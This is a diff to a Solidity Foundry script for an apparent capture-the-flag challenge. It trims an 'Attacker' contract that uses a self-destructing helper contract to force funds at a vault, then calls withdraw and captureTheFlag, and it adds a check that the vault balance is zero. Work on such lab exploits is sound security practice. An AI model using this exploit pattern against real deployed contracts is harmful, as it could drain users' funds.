@@ -3,23 +3,13 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Script.sol";
 
-interface IVault {
-    function transferFrom(
-        address from,
-        address to,
-        uint256 amount
-    ) external returns (bool);
-    
+interface IVault {    
     function withdraw(
         uint256 assets,
         address receiver,
         address owner
     ) external returns (uint256);
-
-    function deposit(uint256 assets, address receiver) external payable returns (uint256);
-
     function captureTheFlag(address newFlagHolder) external;
-
     function flagHolder() external returns (address);
 }
 
@@ -30,9 +20,7 @@ contract SelfDestructable {
     }
 }
 
-contract Attacker {
-    address VCT_owner = 0x8043e6836416d13095567ac645be7C629715885c;
-        
+contract Attacker {    
     IVault vault;
     uint cnt = 0;
 
@@ -53,6 +41,7 @@ contract Attacker {
         d.destruct(address(vault));
 
         vault.withdraw(0 ether, address(this), address(this));
+        require(address(vault).balance == 0, "vault balance is not zero");
         vault.captureTheFlag(newFlagHolder);
     }
 }
